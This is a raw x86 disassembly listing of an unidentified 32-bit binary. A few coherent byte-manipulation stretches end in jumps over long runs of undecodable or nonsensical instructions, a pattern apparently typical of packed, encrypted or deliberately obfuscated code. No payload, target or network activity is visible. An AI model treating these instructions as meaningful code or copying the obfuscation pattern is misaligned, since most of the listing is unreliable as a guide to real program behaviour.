  40c3b5:	movzx  eax,BYTE PTR [ebp-0x1]
  40c3b9:	shl    edx,0x1e
  40c3bc:	mov    dl,BYTE PTR [ebp-0x2]
  40c3bf:	jmp    0x40c7b5
  40c3c4:	(bad)  
  40c3c5:	xor    al,0x5b
  40c3c7:	mov    dl,0x5b
  40c3c9:	call   0x6af2:0x3fac243e
  40c3d0:	dec    edx
  40c3d1:	out    0x41,al
  40c3d3:	mov    esi,0x1818fd0d
  40c3d8:	outs   dx,BYTE PTR ds:[esi]
  40c3d9:	adc    bl,BYTE PTR [eax]
  40c3db:	sbb    BYTE PTR [ecx-0x43094fda],bh
  40c3e1:	js     0x40c3db
  40c3e3:	sub    edx,ebx
  40c3e5:	sbb    ebx,DWORD PTR [eax+0x21c607f6]
  40c3eb:	dec    ebx
  40c3ec:	xlat   BYTE PTR ds:[ebx]
  40c3ed:	fcom   QWORD PTR [eax-0x6f81906f]
  40c3f3:	pop    ecx
  40c3f4:	leave  
  40c3f5:	das    
  40c3f6:	and    dl,bl
  40c3f8:	ret    
  40c3f9:	retf   0x3de6
  40c3fc:	ret    
  40c3fd:	jae    0x40c46b
  40c3ff:	jmp    0xff25:0x8d437ed1
  40c406:	test   BYTE PTR [ecx-0x402ec8da],bl
  40c40c:	and    BYTE PTR [eax+0x6],0x4b
  40c410:	dec    eax
  40c411:	mov    ah,0x34
  40c413:	push   eax
  40c414:	ret    0xae23
  40c417:	adc    DWORD PTR [eax-0x5413e47a],ecx
  40c41d:	call   0x1b2940cb
  40c422:	iret   
  40c423:	mov    eax,eax
  40c425:	(bad)  
  40c427:	sub    eax,0x8aafc530
  40c42c:	lds    esi,FWORD PTR [eax-0xf]
  40c42f:	xor    BYTE PTR [esi*1+0x384e04ec],dh
  40c436:	lock dec ebx
  40c438:	xchg   edi,eax
  40c439:	jl     0x40c3eb
  40c43b:	and    edx,edx
  40c43d:	into   
  40c43e:	push   ss
  40c43f:	adc    bh,dh
  40c441:	imul   ebp,ecx,0x0
  40c444:	inc    ebp
  40c445:	pop    ds
  40c446:	test   al,0x75
  40c448:	jle    0x40c3f5
  40c44a:	mov    bh,0xc8
  40c44c:	jge    0x40c4b7
  40c44e:	call   0xb139:0x8062755
  40c455:	jnp    0x40c418
  40c457:	adc    eax,0x766dbdd
  40c45c:	test   eax,0xff9a9869
  40c461:	out    dx,al
  40c462:	mov    esp,DWORD PTR [ebp+0x7]
  40c465:	bswap  ecx
  40c467:	pushf  
  40c468:	xchg   DWORD PTR [ebp-0x54],edx
  40c46b:	and    al,bh
  40c46d:	call   0xf5e2e4a2
  40c472:	call   0xb54a:0x184692de
  40c479:	cdq    
  40c47a:	icebp  
  40c47b:	lds    edi,FWORD PTR [ecx+0x39]
  40c47e:	xor    dh,BYTE PTR [esi]
  40c480:	inc    ecx
  40c481:	xchg   edi,eax
  40c482:	test   BYTE PTR [ecx],dl
  40c484:	sub    al,0x2c
  40c486:	inc    eax
  40c487:	in     eax,dx
  40c488:	sbb    edx,DWORD PTR [edi+eiz*8+0x7455ab34]
  40c48f:	cmp    eax,0x8ca636f0
  40c494:	push   0x7d431bff
  40c499:	mov    BYTE PTR [ebx+0x53],ah
  40c49c:	cmc    
  40c49d:	pop    ebx
  40c49e:	(bad)  
  40c49f:	bound  ebx,QWORD PTR ds:[ecx-0x34]
  40c4a3:	fs push ebp
  40c4a5:	in     al,dx
  40c4a6:	ret    
  40c4a7:	ja     0x40c508
  40c4a9:	push   cs
  40c4aa:	mov    edi,0xc0a6af05
  40c4af:	enter  0x2973,0xe4
  40c4b3:	in     eax,0x59
  40c4b5:	lock ds ret 
  40c4b8:	dec    eax
  40c4b9:	pop    edi
  40c4ba:	xchg   DWORD PTR [ecx],eax
  40c4bc:	(bad)  [eax+ecx*4-0x65]
  40c4c0:	and    DWORD PTR fs:[eax*4-0xa84e9ab],eax
  40c4c8:	int    0x43
  40c4ca:	rcr    BYTE PTR [eax-0x4035396c],1
  40c4d0:	dec    ebp
  40c4d1:	jbe    0x40c4a3
  40c4d3:	jbe    0x40c49c
  40c4d5:	mov    ah,BYTE PTR [edx+edx*2-0x3967ff45]
  40c4dc:	mov    eax,ds:0xf27b6135
  40c4e1:	xlat   BYTE PTR ds:[ebx]
  40c4e2:	pop    ecx
  40c4e3:	inc    ecx
  40c4e4:	xchg   DWORD PTR [eax],edx
  40c4e6:	int3   
  40c4e7:	ret    0xd823
  40c4ea:	ins    BYTE PTR es:[edi],dx
  40c4eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4ec:	inc    ebp
  40c4ed:	test   BYTE PTR [eax+edx*8+0x27],dl
  40c4f1:	xchg   DWORD PTR [ebx],eax
  40c4f3:	mov    eax,ds:0x4348f97f
  40c4f8:	add    eax,0xe28aa640
  40c4fd:	cs xor al,0xd0
  40c500:	popa   
  40c501:	imul   edx,DWORD PTR [ecx+0x47],0x1749d1a6
  40c508:	dec    ebx
  40c509:	out    0xc7,al
  40c50b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c50c:	xor    edx,esi
  40c50e:	ja     0x40c4af
  40c510:	std    
  40c511:	in     eax,0xcf
  40c513:	fcom   QWORD PTR [esi+edx*4-0x6b]
  40c517:	in     al,0xce
  40c519:	push   ecx
  40c51a:	popf   
  40c51b:	jb     0x40c53b
  40c51d:	cmp    BYTE PTR [esi],ch
  40c51f:	and    BYTE PTR [esi+0x33868b25],cl
  40c525:	out    0xd9,eax
  40c527:	mov    edi,esi
  40c529:	mov    DWORD PTR [esi+esi*1],ebp
  40c52c:	inc    edi
  40c52d:	xchg   esp,eax
  40c52e:	js     0x40c53b
  40c530:	xlat   BYTE PTR ds:[ebx]
  40c531:	ret    0x5b24
  40c534:	cwde   
  40c535:	mov    esi,0x6c82b4ca
  40c53a:	xchg   ebx,eax
  40c53b:	mov    eax,ds:0xb3b88188
  40c540:	jg     0x40c518
  40c542:	push   cs
  40c543:	dec    esp
  40c544:	jle    0x40c587
  40c546:	jmp    0x75500af6
  40c54b:	fadd   DWORD PTR [ecx]
  40c54d:	es int3 
  40c54f:	fstp   QWORD PTR [edx-0x73]
  40c552:	or     esi,DWORD PTR [edi-0x3e2ce3fc]
  40c558:	inc    esi
  40c559:	div    ecx
  40c55b:	mov    ah,dl
  40c55d:	pop    ebx
  40c55e:	xor    BYTE PTR [eax],al
  40c560:	mov    ah,0x54
  40c562:	retf   
  40c563:	(bad)  
  40c564:	ins    BYTE PTR es:[edi],dx
  40c565:	sbb    BYTE PTR [esi+0x2c],bl
  40c568:	scas   al,BYTE PTR es:[edi]
  40c569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c56a:	adc    dh,ah
  40c56c:	jle    0x40c5e6
  40c56e:	neg    bh
  40c570:	dec    BYTE PTR [ebp-0x5b3dae0e]
  40c576:	push   ecx
  40c577:	jnp    0x40c5da
  40c579:	jecxz  0x40c510
  40c57b:	stos   BYTE PTR es:[edi],al
  40c57c:	xlat   BYTE PTR ds:[ebx]
  40c57d:	jge    0x40c55e
  40c57f:	push   ebp
  40c580:	push   eax
  40c581:	test   BYTE PTR [esi-0x39668de2],al
  40c587:	mov    esp,DWORD PTR [edx+0x2e]
  40c58a:	pop    ss
  40c58b:	sub    edi,esi
  40c58d:	mov    ds:0x7c359046,al
  40c592:	into   
  40c593:	(bad)  
  40c594:	ja     0x40c613
  40c596:	cmp    bh,BYTE PTR [edx+ebp*2-0x3e]
  40c59a:	retf   0xc953
  40c59d:	test   DWORD PTR [ebx+0x1184a1de],eax
  40c5a3:	in     eax,0x5f
  40c5a5:	ficom  WORD PTR ds:0xada5056a
  40c5ab:	ss in  eax,dx
  40c5ad:	push   ds
  40c5ae:	push   ss
  40c5af:	cwde   
  40c5b0:	or     BYTE PTR [ebp+0x47879076],dl
  40c5b6:	adc    DWORD PTR [ebx+edx*8-0x7f419ad1],0xb89dce5
  40c5c1:	xor    ebp,DWORD PTR [ecx+edx*8]
  40c5c4:	add    BYTE PTR [ebx-0x1154f61f],0x34
  40c5cb:	test   al,0x3
  40c5cd:	leave  
  40c5ce:	inc    edx
  40c5cf:	push   cs
  40c5d0:	mov    ch,0x80
  40c5d2:	imul   esi,DWORD PTR [edi],0x46
  40c5d5:	cmp    DWORD PTR [edx+0x7a8d8bde],esp
  40c5db:	fwait
  40c5dc:	mov    eax,ds:0xc22c4af1
  40c5e1:	push   ecx
  40c5e2:	out    dx,eax
  40c5e3:	ds int3 
  40c5e5:	ror    BYTE PTR [esi+0x1dd08f06],0x41
  40c5ec:	push   cs
  40c5ed:	(bad)  
  40c5ee:	sbb    dl,BYTE PTR [esi]
  40c5f0:	mov    bh,0xc9
  40c5f2:	mov    al,0x33
  40c5f4:	or     edx,DWORD PTR [esi-0xcd4c036]
  40c5fa:	pusha  
  40c5fb:	(bad)  
  40c5fc:	retf   0xfe05
  40c5ff:	xlat   BYTE PTR ds:[ebx]
  40c600:	pop    es
  40c601:	repz xor al,0x23
  40c604:	fst    DWORD PTR [edi+0x3c]
  40c607:	inc    esi
  40c608:	adc    BYTE PTR [esi-0x2986e6dc],bh
  40c60e:	inc    esi
  40c60f:	je     0x40c66f
  40c611:	mov    ecx,0xa3b40667
  40c616:	cmp    BYTE PTR [ebx+0x6b],bl
  40c619:	inc    ebx
  40c61a:	clc    
  40c61b:	inc    ecx
  40c61c:	scas   eax,DWORD PTR es:[edi]
  40c61d:	hlt    
  40c61e:	jmp    0xfc424bd7
  40c623:	test   eax,0x54d7f1fd
  40c628:	xchg   edx,eax
  40c629:	xor    ch,BYTE PTR [edx+0x39]
  40c62c:	popf   
  40c62d:	dec    esp
  40c62e:	and    al,0x4a
  40c630:	aas    
  40c631:	out    0xc2,eax
  40c633:	cdq    
  40c634:	retf   
  40c635:	jg     0x40c66f
  40c637:	ss pop esp
  40c639:	mov    dh,0x36
  40c63b:	or     ch,dl
  40c63d:	or     BYTE PTR [esi-0x19],cl
  40c640:	add    cl,bl
  40c642:	or     BYTE PTR [ecx-0x1],ah
  40c645:	scas   al,BYTE PTR es:[edi]
  40c646:	stos   BYTE PTR es:[edi],al
  40c647:	mov    ebp,cs
  40c649:	mov    eax,0x4cf6a2
  40c64e:	out    0x75,al
  40c650:	loopne 0x40c65f
  40c652:	ror    DWORD PTR [edi-0x57],cl
  40c655:	scas   al,BYTE PTR es:[edi]
  40c656:	popf   
  40c657:	dec    esp
  40c658:	sbb    dl,0xd2
  40c65b:	dec    ecx
  40c65c:	mov    esp,0xdb696fa3
  40c661:	fcomp  DWORD PTR [edx]
  40c663:	mov    edi,0xd5be4d38
  40c668:	or     al,0x6c
  40c66a:	pop    ss
  40c66b:	int3   
  40c66c:	fs popaw 
  40c66f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c670:	xor    cl,0x43
  40c673:	and    eax,0x33bf4ac0
  40c678:	jb     0x40c629
  40c67a:	retf   0x5816
  40c67d:	sti    
  40c67e:	adc    edi,DWORD PTR [eax+0x77b42faf]
  40c684:	ss or  bh,bl
  40c687:	dec    esi
  40c688:	aaa    
  40c689:	aaa    
  40c68a:	mov    WORD PTR ds:0x4a647b7,ds
  40c690:	ficom  WORD PTR [ebp-0x69]
  40c693:	pop    edi
  40c694:	dec    ebx
  40c695:	push   edi
  40c696:	sub    dh,BYTE PTR [esi+esi*8]
  40c699:	aam    0x36
  40c69b:	dec    esi
  40c69c:	pop    esi
  40c69d:	retf   0x8428
  40c6a0:	outs   dx,DWORD PTR ds:[esi]
  40c6a1:	sbb    BYTE PTR [ebx-0x774e7e5b],0xb
  40c6a8:	mov    eax,0xb633baad
  40c6ad:	and    eax,eax
  40c6af:	fwait
  40c6b0:	std    
  40c6b1:	ja     0x40c66c
  40c6b3:	repnz sbb DWORD PTR [esi+eax*4+0x1ad430b2],ecx
  40c6bb:	push   ebp
  40c6bc:	rcr    DWORD PTR [ebx-0x7c],1
  40c6bf:	sub    eax,0x98a71308
  40c6c4:	leavew 
  40c6c6:	sub    esi,ecx
  40c6c8:	out    dx,eax
  40c6c9:	cmp    al,0x88
  40c6cb:	mov    edx,0x93a98666
  40c6d0:	xchg   edi,eax
  40c6d1:	outs   dx,BYTE PTR ds:[esi]
  40c6d2:	pop    edi
  40c6d3:	sbb    esi,esp
  40c6d5:	les    esp,FWORD PTR [eax-0x6af0cf79]
  40c6db:	jb     0x40c724
  40c6dd:	ret    
  40c6de:	or     al,0xcd
  40c6e0:	out    dx,al
  40c6e1:	inc    eax
  40c6e2:	mov    al,ds:0x520de9
  40c6e7:	pop    esp
  40c6e8:	jge    0x40c718
  40c6ea:	push   esi
  40c6eb:	xchg   edi,eax
  40c6ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6ed:	xor    ebx,esi
  40c6ef:	(bad)  
  40c6f0:	pop    ebx
  40c6f1:	mov    dh,0x4
  40c6f3:	nop
  40c6f4:	aas    
  40c6f5:	pop    es
  40c6f6:	lea    esi,[esi+0x1c4562c3]
  40c6fc:	jns    0x40c6dd
  40c6fe:	jmp    0xeae9:0xf2e0082d
  40c705:	fwait
  40c706:	into   
  40c707:	arpl   bx,cx
  40c709:	lods   al,BYTE PTR ds:[esi]
  40c70a:	idiv   BYTE PTR [eax+ebp*8]
  40c70d:	jbe    0x40c6c3
  40c70f:	dec    ebp
  40c710:	inc    esi
  40c711:	push   eax
  40c712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c713:	in     al,dx
  40c714:	pop    esp
  40c715:	fst    DWORD PTR [edi-0x3e]
  40c718:	les    eax,FWORD PTR [eax-0x46a23e58]
  40c71e:	fmul   QWORD PTR [edx+0x1]
  40c721:	daa    
  40c722:	jbe    0x40c769
  40c724:	mov    bl,0xa1
  40c726:	dec    ecx
  40c727:	jae    0x40c79c
  40c729:	mov    esi,0x5893e247
  40c72e:	push   es
  40c72f:	adc    DWORD PTR [esi-0x201c17ad],0xbe3ecedb
  40c739:	pop    esp
  40c73a:	sub    DWORD PTR [eax-0x58],0x39a7c235
  40c741:	mov    dh,BYTE PTR [eax+0x7e]
  40c744:	(bad)  
  40c745:	cmp    eax,0x9eb074ee
  40c74a:	mov    edi,0x37302a38
  40c74f:	and    bl,al
  40c751:	in     al,dx
  40c752:	mov    eax,0xda2a6519
  40c757:	mov    esi,0xe2e93a99
  40c75c:	out    0xb7,eax
  40c75e:	sbb    BYTE PTR [esi],cl
  40c760:	fwait
  40c761:	mov    edx,0x343f389c
  40c766:	loop   0x40c747
  40c768:	push   ebx
  40c769:	dec    esp
  40c76a:	mov    bl,0x25
  40c76c:	out    0x84,eax
  40c76e:	mov    ?,esi
  40c770:	pop    ebx
  40c771:	xchg   esp,eax
  40c772:	sub    edx,DWORD PTR [ebx]
  40c774:	or     DWORD PTR [eax-0x54],eax
  40c777:	rcr    eax,0xb5
  40c77a:	(bad)  
  40c77b:	fist   WORD PTR [ebx-0x2a890c4c]
  40c781:	scas   al,BYTE PTR es:[edi]
  40c782:	lods   al,BYTE PTR ds:[esi]
  40c783:	jns    0x40c7c0
  40c785:	(bad)  
  40c786:	std    
  40c787:	sub    DWORD PTR [ebp-0x5c4be7ae],esi
  40c78d:	movaps XMMWORD PTR cs:[bx+di+0x7e],xmm1
  40c793:	pushf  
  40c794:	or     ebx,DWORD PTR [eax-0x4a]
  40c797:	cld    
  40c798:	fcomp  DWORD PTR [esi-0x117c47a4]
  40c79e:	mov    ds:0x2c851687,eax
  40c7a3:	pop    eax
  40c7a4:	pop    ebp
  40c7a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7a6:	int3   
  40c7a7:	push   ss
  40c7a8:	jmp    0x1779:0x91a001e7
  40c7af:	mov    esi,0x24d766bb
  40c7b4:	int3   
  40c7b5:	xor    al,0x42
  40c7b7:	add    al,dl
  40c7b9:	push   0x6
  40c7bb:	add    eax,0xfa
  40c7c0:	mov    BYTE PTR [ebp-0x4],al
  40c7c3:	mov    BYTE PTR [ebp-0x3],0x67
  40c7c7:	pop    eax
  40c7c8:	mov    BYTE PTR [ebp-0x1],al
  40c7cb:	mov    BYTE PTR [ebp-0x2],0x3
  40c7cf:	mov    dl,BYTE PTR [ebp-0x2]
  40c7d2:	movzx  esi,dl
  40c7d5:	cdq    
  40c7d6:	idiv   esi
  40c7d8:	mov    dl,BYTE PTR [ebp-0x1]
  40c7db:	add    al,dl
  40c7dd:	mov    dl,BYTE PTR [ebp-0x3]
  40c7e0:	or     al,dl
  40c7e2:	mov    dl,BYTE PTR [ebp-0x4]
  40c7e5:	add    al,0x3a
  40c7e7:	cmp    dl,al
  40c7e9:	jmp    0x40cbdf
  40c7ee:	xchg   esi,eax
  40c7ef:	and    al,dl
  40c7f1:	cmc    
  40c7f2:	mov    ds:0xdc222674,al
  40c7f7:	mov    cl,BYTE PTR [edi+0x21238b70]
  40c7fd:	jle    0x40c862
  40c7ff:	cmc    
  40c800:	sbb    BYTE PTR [eax],bl
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	adc    bl,BYTE PTR [eax]
  40c805:	sbb    BYTE PTR [esi+0x70f72a33],dh
  40c80b:	cmp    eax,0x9f19f1fb
  40c810:	add    eax,0xb1fbd0df
  40c815:	or     edi,ebp
  40c817:	and    eax,0x3692eb0b
  40c81c:	stc    
  40c81d:	sub    edi,DWORD PTR [eax-0x71]
  40c820:	cmc    
  40c821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c823:	inc    edx
  40c824:	adc    ecx,ebp
  40c826:	and    al,0x74
  40c828:	jmp    0x40c85f
  40c82a:	ja     0x40c87d
  40c82c:	xchg   edx,eax
  40c82d:	mov    cl,0xe0
  40c82f:	arpl   WORD PTR [edx],ax
  40c831:	pop    eax
  40c832:	in     al,dx
  40c833:	add    BYTE PTR [ebx+0x12542a75],dl
  40c839:	add    al,0x8b
  40c83b:	test   al,0x6c
  40c83d:	ins    BYTE PTR es:[edi],dx
  40c83e:	push   esi
  40c83f:	dec    esi
  40c840:	jg     0x40c814
  40c842:	inc    BYTE PTR [ecx-0x6b]
  40c845:	jo     0x40c87f
  40c847:	jl     0x40c89b
  40c849:	inc    edx
  40c84a:	add    al,0x9a
  40c84c:	add    DWORD PTR [edx+0x1b],edi
  40c84f:	iret   
  40c850:	jecxz  0x40c877
  40c852:	stos   BYTE PTR es:[edi],al
  40c853:	in     al,0x49
  40c855:	lods   al,BYTE PTR ds:[esi]
  40c856:	fcmovbe st,st(3)
  40c858:	inc    ecx
  40c859:	jo     0x40c80c
  40c85b:	in     al,dx
  40c85c:	cmp    ebx,DWORD PTR [ecx]
  40c85e:	shl    BYTE PTR [edi],cl
  40c860:	enter  0x9ce0,0x9a
  40c864:	call   0xc8fa:0x36b1b969
  40c86b:	nop
  40c86c:	jae    0x40c8bb
  40c86e:	inc    edi
  40c86f:	popa   
  40c870:	jbe    0x40c7f8
  40c872:	test   al,0xcc
  40c874:	aaa    
  40c875:	clc    
  40c876:	popf   
  40c877:	xor    al,0x37
  40c879:	dec    edx
  40c87a:	push   ecx
  40c87b:	sahf   
  40c87c:	push   ecx
  40c87d:	dec    ebx
  40c87e:	mov    ds:0x8d80a179,eax
  40c883:	lods   al,BYTE PTR ds:[esi]
  40c884:	fs xchg ebp,eax
  40c886:	call   0x157cb5f7
  40c88b:	cli    
  40c88c:	ss in  eax,dx
  40c88e:	pop    ds
  40c88f:	rcr    ebp,1
  40c891:	aaa    
  40c892:	cmp    eax,0xa95365b8
  40c897:	scas   al,BYTE PTR es:[edi]
  40c898:	test   BYTE PTR [esi],bh
  40c89a:	pop    ecx
  40c89b:	ret    
  40c89c:	(bad)  
  40c89d:	aam    0xa7
  40c89f:	add    bl,0x0
  40c8a2:	fnstcw WORD PTR [edx+0x70]
  40c8a5:	les    edi,FWORD PTR cs:[edi]
  40c8a8:	(bad)  
  40c8aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8ab:	call   0xfc41cc58
  40c8b0:	xor    eax,0xbb0fc477
  40c8b5:	mov    ah,0xae
  40c8b7:	xchg   ebp,eax
  40c8b8:	mov    al,ds:0x2aef5ff2
  40c8bd:	sub    al,0x9
  40c8bf:	add    eax,0x94a43633
  40c8c4:	pop    esi
  40c8c5:	sub    BYTE PTR [edx*2-0x7d02e704],0xac
  40c8cd:	addr16 xchg edx,eax
  40c8cf:	mov    cl,0xa0
  40c8d1:	rcr    DWORD PTR [edi+0x325dc392],cl
  40c8d7:	jb     0x40c8b0
  40c8d9:	jg     0x40c909
  40c8db:	pop    esi
  40c8dc:	xor    DWORD PTR [ebx-0x40],esp
  40c8df:	popa   
  40c8e0:	retf   
  40c8e1:	cmp    eax,0xf60797a0
  40c8e6:	clc    
  40c8e7:	(bad)  
  40c8e8:	aam    0x35
  40c8ea:	xor    edi,DWORD PTR [esi+ebp*2+0x51]
  40c8ee:	xchg   esp,eax
  40c8ef:	retf   0x5c78
  40c8f2:	ds sti 
  40c8f4:	sub    BYTE PTR [eax+edx*8+0x7067f778],bl
  40c8fb:	orps   xmm6,XMMWORD PTR [esi+0x4c]
  40c8ff:	mov    ebx,0xd3b85817
  40c904:	sub    eax,DWORD PTR [ecx]
  40c906:	pop    eax
  40c907:	add    al,0xe0
  40c909:	add    al,BYTE PTR [edi+0x6b]
  40c90c:	xchg   edx,eax
  40c90d:	je     0x40c8af
  40c90f:	adc    eax,0x13f10c86
  40c914:	pushf  
  40c915:	jae    0x40c8b0
  40c917:	push   0xea067784
  40c91c:	mov    bl,0xfb
  40c91e:	lods   eax,DWORD PTR ds:[esi]
  40c91f:	lds    edi,FWORD PTR [eax+0x3]
  40c922:	jae    0x40c986
  40c924:	je     0x40c8b1
  40c926:	loop   0x40c8f5
  40c928:	push   0xffffff8f
  40c92a:	sub    esi,DWORD PTR ds:0xcd87572a
  40c930:	imul   esp,DWORD PTR [edx-0x56],0xffffffdf
  40c934:	mov    ah,0x51
  40c936:	mov    bl,0xdc
  40c938:	rcr    ecx,0xa6
  40c93b:	stc    
  40c93c:	or     eax,0x7bbe319d
  40c941:	inc    edx
  40c942:	jo     0x40c8f8
  40c944:	fwait
  40c945:	xor    DWORD PTR [edx-0x1e],0xe927a2b
  40c94c:	test   al,0x87
  40c94e:	or     BYTE PTR [ecx-0x61],0x86
  40c952:	sti    
  40c953:	lods   al,BYTE PTR ds:[esi]
  40c954:	(bad)  
  40c955:	(bad)  [esi-0x691ec589]
  40c95b:	out    dx,al
  40c95c:	inc    ebx
  40c95d:	les    esi,FWORD PTR [edi-0x29ce2d57]
  40c963:	ins    DWORD PTR es:[edi],dx
  40c964:	out    0x46,al
  40c966:	int    0xce
  40c968:	ss pop ebp
  40c96a:	xchg   esp,eax
  40c96b:	shl    BYTE PTR [eax+0x544a8cb3],0x13
  40c972:	clc    
  40c973:	push   edi
  40c974:	cmp    al,0xf1
  40c976:	outs   dx,DWORD PTR ds:[esi]
  40c977:	addr16 ss enter 0x994b,0x9e
  40c97d:	xor    al,0xf9
  40c97f:	bound  edi,QWORD PTR [esi+0x7dacef51]
  40c985:	(bad)  
  40c986:	push   edi
  40c987:	ficomp WORD PTR [eax+0x1c]
  40c98a:	jmp    0x40c916
  40c98c:	or     bl,bl
  40c98e:	(bad)  
  40c990:	cmp    dl,ah
  40c992:	aam    0x92
  40c994:	loopne 0x40c92b
  40c996:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c997:	daa    
  40c998:	add    BYTE PTR [edi],dh
  40c99a:	mov    eax,0x5a525da4
  40c99f:	add    DWORD PTR [edi+0x31be2512],edi
  40c9a5:	leave  
  40c9a6:	test   BYTE PTR [edi],bl
  40c9a8:	scas   al,BYTE PTR es:[edi]
  40c9a9:	das    
  40c9aa:	shr    DWORD PTR [edi-0x6612425e],cl
  40c9b0:	neg    DWORD PTR [eax]
  40c9b2:	fiadd  WORD PTR [ebx-0x4cc3e4c2]
  40c9b8:	in     al,dx
  40c9b9:	xor    ah,BYTE PTR [ebp+0x76a62ee6]
  40c9bf:	sbb    DWORD PTR [esi+0x3f661e6e],ebx
  40c9c5:	sbb    BYTE PTR [ebx],0x46
  40c9c8:	jge    0x40c9fa
  40c9ca:	outs   dx,DWORD PTR ds:[esi]
  40c9cb:	mov    ecx,0xb4c8bbd0
  40c9d0:	dec    esi
  40c9d1:	sahf   
  40c9d2:	shl    ch,0xc8
  40c9d5:	inc    BYTE PTR [ebx+0x37]
  40c9d8:	pop    esp
  40c9d9:	xor    dl,BYTE PTR [ecx]
  40c9db:	test   eax,0xe9453be6
  40c9e0:	dec    edx
  40c9e1:	pop    ecx
  40c9e2:	xchg   DWORD PTR [edi+0x54],ecx
  40c9e5:	mov    DWORD PTR [ebp+0x75],esp
  40c9e8:	mov    BYTE PTR [edi-0x43],dl
  40c9eb:	or     al,0xf8
  40c9ed:	cmp    cl,al
  40c9ef:	clc    
  40c9f0:	mov    bh,0x7e
  40c9f2:	in     eax,0x6e
  40c9f4:	cli    
  40c9f5:	ins    BYTE PTR es:[edi],dx
  40c9f6:	bnd je 0x40ca3b
  40c9f9:	loopne 0x40c996
  40c9fb:	cld    
  40c9fc:	adc    dl,dh
  40c9fe:	fwait
  40c9ff:	lea    edi,ds:0x9a7326b0
  40ca05:	das    
  40ca06:	xor    al,ah
  40ca08:	xor    BYTE PTR [edx],0x7f
  40ca0b:	ins    DWORD PTR es:[edi],dx
  40ca0c:	inc    eax
  40ca0d:	jg     0x40c9a0
  40ca0f:	add    al,0x8a
  40ca11:	stos   BYTE PTR es:[edi],al
  40ca12:	xor    BYTE PTR [ebx+0x1a],al
  40ca15:	cwde   
  40ca16:	cmp    al,0x5a
  40ca18:	loopne 0x40ca7a
  40ca1a:	sub    DWORD PTR [ecx-0x5d4b608d],esp
  40ca20:	loop   0x40c9b6
  40ca22:	aad    0x31
  40ca24:	cld    
  40ca25:	cwde   
  40ca26:	div    BYTE PTR [ecx-0x35c036fe]
  40ca2c:	iret   
  40ca2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca2e:	lock push esi
  40ca30:	pushf  
  40ca31:	pop    ebp
  40ca32:	xor    al,0x6a
  40ca34:	outs   dx,BYTE PTR ds:[esi]
  40ca35:	repz mov edx,0x2a8ad469
  40ca3b:	aaa    
  40ca3c:	sub    bl,BYTE PTR [ecx-0x32f7d531]
  40ca42:	inc    ebp
  40ca43:	xor    edi,DWORD PTR [ebx-0x1403703d]
  40ca49:	and    eax,0xb6089d6f
  40ca4e:	dec    esp
  40ca4f:	mov    dh,0x48
  40ca51:	out    dx,al
  40ca52:	js     0x40c9f4
  40ca54:	add    BYTE PTR [ebp+0x42],cl
  40ca57:	sbb    ecx,DWORD PTR [ebp+0x21]
  40ca5a:	stos   BYTE PTR es:[edi],al
  40ca5b:	data16 sbb BYTE PTR [edi-0x6870ff2d],dh
  40ca62:	xchg   ecx,eax
  40ca63:	fucomip st,st(7)
  40ca65:	out    0x38,al
  40ca67:	sbb    dl,bh
  40ca69:	sbb    al,0x6c
  40ca6b:	hlt    
  40ca6c:	sahf   
  40ca6d:	mov    BYTE PTR [esi],cl
  40ca6f:	mov    bl,0x68
  40ca71:	mov    bh,0xf5
  40ca73:	lds    edi,FWORD PTR [esi+0x16]
  40ca76:	add    esp,0x22
  40ca79:	xchg   edx,eax
  40ca7a:	mov    cl,0x9a
  40ca7c:	inc    ebp
  40ca7d:	loopne 0x40ca4d
  40ca7f:	std    
  40ca80:	xchg   BYTE PTR [ecx],ah
  40ca82:	sub    edx,0x2a7f9766
  40ca88:	sar    edi,cl
  40ca8a:	jno    0x40ca96
  40ca8c:	daa    
  40ca8d:	leave  
  40ca8e:	mov    edi,0x8f45f4cd
  40ca93:	jge    0x40ca90
  40ca95:	adc    ecx,edx
  40ca97:	fdivr  QWORD PTR [ebx+edi*2]
  40ca9a:	sub    al,0x1d
  40ca9c:	lahf   
  40ca9d:	or     dh,BYTE PTR ds:0x882ade4a
  40caa3:	je     0x40ca75
  40caa5:	dec    eax
  40caa6:	test   BYTE PTR [ebx+0x5334a510],al
  40caac:	(bad)  
  40caad:	daa    
  40caae:	jg     0x40ca6c
  40cab0:	repz iret 
  40cab2:	mov    eax,ds:0xef83363f
  40cab7:	imul   eax,ebx,0xffffffc2
  40caba:	mov    al,ds:0x17aa5e8c
  40cabf:	cmp    esi,DWORD PTR [edi-0x3d5cd68c]
  40cac5:	fsubr  QWORD PTR [edi+edi*2-0x434deb2a]
  40cacc:	xchg   ebx,eax
  40cacd:	jns    0x40ca52
  40cacf:	iret   
  40cad0:	jne    0x40cb13
  40cad2:	icebp  
  40cad3:	inc    ecx
  40cad4:	fwait
  40cad5:	cwde   
  40cad6:	cmp    edx,edi
  40cad8:	sahf   
  40cad9:	push   esi
  40cada:	mov    edi,0xac6db892
  40cadf:	(bad)  
  40cae0:	rcr    bh,1
  40cae2:	arpl   WORD PTR [ecx],si
  40cae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cae5:	or     al,0x2e
  40cae7:	(bad)
  40caea:	dec    esp
  40caeb:	int3   
  40caec:	push   edi
  40caed:	fwait
  40caee:	mov    dh,0xcd
  40caf0:	mov    dl,cl
  40caf2:	daa    
  40caf3:	(bad)  
  40caf4:	jmp    0x2dc1:0x80e73655
  40cafb:	mov    esi,0x5d6d157a
  40cb00:	jnp    0x40cb53
  40cb02:	ret    0xba9
  40cb05:	and    BYTE PTR [ebp+0x752570ab],ch
  40cb0b:	(bad)  
  40cb0c:	cld    
  40cb0d:	bnd jp 0x40cb09
  40cb10:	add    al,0xf5
  40cb12:	test   al,0xab
  40cb14:	out    dx,eax
  40cb15:	or     eax,edi
